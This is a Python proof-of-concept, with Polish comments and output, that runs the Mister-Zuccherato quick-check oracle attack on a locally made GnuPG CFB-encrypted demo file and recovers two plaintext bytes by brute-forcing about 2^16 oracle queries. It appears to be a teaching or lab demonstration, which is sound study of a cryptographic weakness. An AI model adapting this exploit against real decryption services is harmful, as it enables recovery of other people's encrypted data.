import subprocess
import os
import tempfile
import sys
import time
from pathlib import Path

GPG_FILE = "target_mz.gpg"
BS = 16 
MAX_D = 1 << 16 


def xor_bytes(*chunks: bytes) -> bytes:
    n = len(chunks[0])
    out = bytearray(n)
    for c in chunks:
        assert len(c) == n
        for i in range(n):
            out[i] ^= c[i]
    return bytes(out)


def parse_gpg(path: str) -> tuple[bytes, int]:
    raw = Path(path).read_bytes()
    pos = 0
    ctb1 = raw[pos]
    pos += 1
    if ctb1 & 0x40:  
        plen = raw[pos]
        pos += 1
        if 192 <= plen < 224:
            plen = ((plen - 192) << 8) + raw[pos] + 192
            pos += 1
    else: 
        len_type = ctb1 & 0x03
        size_map = [1, 2, 4, 1]
        ln = size_map[len_type]
        plen = int.from_bytes(raw[pos:pos + ln], "big")
        pos += ln
    pos += plen  

    ctb2 = raw[pos]
    pos += 1
    len2 = raw[pos]
    pos += 1
    if 192 <= len2 < 224:
        len2 = ((len2 - 192) << 8) + raw[pos] + 192
        pos += 1
    return raw, pos


_query_count = [0]

_GPG_ENV = dict(os.environ, LC_ALL="C", LANGUAGE="C")


def quick_check_oracle(hdr: bytes, candidate_ct: bytes) -> bool:
    _query_count[0] += 1
    full = hdr + candidate_ct
    with tempfile.NamedTemporaryFile(suffix=".gpg", delete=False) as f:
        f.write(full)
        tmp = f.name
    try:
        proc = subprocess.run(
            ["gpg", "--batch", "--passphrase", "demo",
             "--pinentry-mode", "loopback",
             "--allow-old-cipher-algos", "--decrypt", tmp],
            capture_output=True, env=_GPG_ENV,
        )
    finally:
        os.unlink(tmp)
    stderr = proc.stderr.decode(errors="replace")

    return "bad session key" not in stderr.lower()


def sanity_check(hdr: bytes, ct: bytes) -> bool:
    print("[Test poczytalności wyroczni]")

    baseline = quick_check_oracle(hdr, ct)
    print(f"    Niezmodyfikowany plik -> oracle={baseline} (oczekiwano: True)")

    broken = bytearray(ct)
    broken[16] ^= 0xFF 
    broken_result = quick_check_oracle(hdr, bytes(broken))
    print(f"    Zepsuty bajt C2 (ct[16]) -> oracle={broken_result}")

    if baseline and not broken_result:
        print("    [OK] Wyrocznia poprawnie rozróżnia PASS/FAIL.\n")
        return True

    print("    [BŁĄD] Wyrocznia nie rozróżnia poprawnie PASS/FAIL")

    return False


def search_D(hdr: bytes, block1: bytes, tail: bytes,
             max_d: int = MAX_D, progress_every: int = 4096) -> int | None:
    t0 = time.time()
    for d in range(max_d):
        d_bytes = d.to_bytes(2, "big")
        candidate = block1 + d_bytes + tail
        if quick_check_oracle(hdr, candidate):
            print(f"    [+] Znaleziono D=0x{d:04x} po {d + 1} zapytaniach "
                  f"({time.time() - t0:.1f}s)")
            return d
        if progress_every and (d + 1) % progress_every == 0:
            elapsed = time.time() - t0
            rate = (d + 1) / elapsed if elapsed > 0 else 0
            print(f"    ... {d + 1}/{max_d} zapytań "
                  f"({rate:.0f} zapytań/s, upłynęło {elapsed:.0f}s)")
    print("    [!] Nie znaleziono D w całej przestrzeni.")
    return None


def main():
    if not os.path.exists(GPG_FILE):
        print(f"[!] Brak pliku {GPG_FILE}.")
        sys.exit(1)

    raw, ct_offset = parse_gpg(GPG_FILE)
    ct = raw[ct_offset:]
    hdr = raw[:ct_offset]

    C1 = ct[0:16]
    C2 = ct[16:18]
    C3 = ct[18:34]
    C4 = ct[34:50]

    verify = subprocess.run(
        ["gpg", "--batch", "--quiet", "--passphrase", "demo",
         "--pinentry-mode", "loopback", "--allow-old-cipher-algos",
         "--decrypt", GPG_FILE],
        capture_output=True, env=_GPG_ENV,
    )
    true_plaintext = verify.stdout

    if len(true_plaintext) < 16:
        print("[!] Plaintext za krótki do demonstracji.")
        sys.exit(1)

    print("=" * 70)
    print("ATAK MISTER-ZUCCHERATO - wyrocznia 1-bitowa")
    print("=" * 70)
    print(f"C1={C1.hex()}  C2={C2.hex()}  C3={C3.hex()}  C4={C4.hex()}")
    print()

    if not sanity_check(hdr, ct):
        sys.exit(1)

    # FAZA A

    LITERAL_PACKET_CTB = 0xC0 | 11  

    assumed_message_len = len(true_plaintext)  
    body_len = 1 + 1 + 0 + 4 + assumed_message_len
    if body_len >= 192:
        print("[!] Demonstracja obsługuje tylko wiadomości o body < 192 B")
        sys.exit(1)
    literal_header_prediction = bytes([LITERAL_PACKET_CTB, body_len])

    print("[Faza A] Wyznaczanie [E_K(0)]_(b-1,b) -- setup, oczekiwane ~2^15 zapytań")
    print(f"    Znane 2 bajty M1 (przewidziane ze struktury pakietu): "
          f"{literal_header_prediction!r}")

    block1_A = C1[2:16] + C2  
    tail_A = ct[18:]

    d_setup = search_D(hdr, block1_A, tail_A)
    if d_setup is None:
        sys.exit(1)

    E_block1_A_first2 = xor_bytes(C3[:2], literal_header_prediction)
    E_K0_last2 = xor_bytes(C2, d_setup.to_bytes(2, "big"), E_block1_A_first2)
    print(f"    [E_K(0)]_(b-1,b) = {E_K0_last2.hex()}")
    print()

    # FAZA B 

    print("[Faza B] Odzyskiwanie [M2]_1,2 -- atak właściwy, oczekiwane ~2^15 zapytań")
    block1_B = C3          # C_(i+2) dla i=1
    tail_B = ct[18:]

    d_attack = search_D(hdr, block1_B, tail_B)
    if d_attack is None:
        sys.exit(1)

    E_C3_first2 = xor_bytes(C3[-2:], d_attack.to_bytes(2, "big"), E_K0_last2)
    M2_first2 = xor_bytes(E_C3_first2, C4[:2])

    print(f"    [E_K(C3)]_1,2 = {E_C3_first2.hex()}")
    print(f"    Odzyskane [M2]_1,2 = {M2_first2!r} (hex: {M2_first2.hex()})")
    print()

    # Weryfikacja

    header_total_len = 2 + 1 + 1 + 0 + 4  
    m2_text_offset = 16 - header_total_len
    true_M2_first2 = (true_plaintext[m2_text_offset:m2_text_offset + 2]
                       if len(true_plaintext) >= m2_text_offset + 2 else b"??")
    match = (M2_first2 == true_M2_first2)
    print("=" * 70)
    print(f"Prawdziwe [M2]_1,2  : {true_M2_first2!r}")
    print(f"Odzyskane [M2]_1,2  : {M2_first2!r}")
    print(f"Zgodność            : {'OK' if match else 'BŁĄD'}")
    print(f"Łączna liczba zapytań do wyroczni: {_query_count[0]} "
          f"(teoria: ~2 x 2^15 = ~65536 średnio)")
    print("=" * 70)


if __name__ == "__main__":
    main()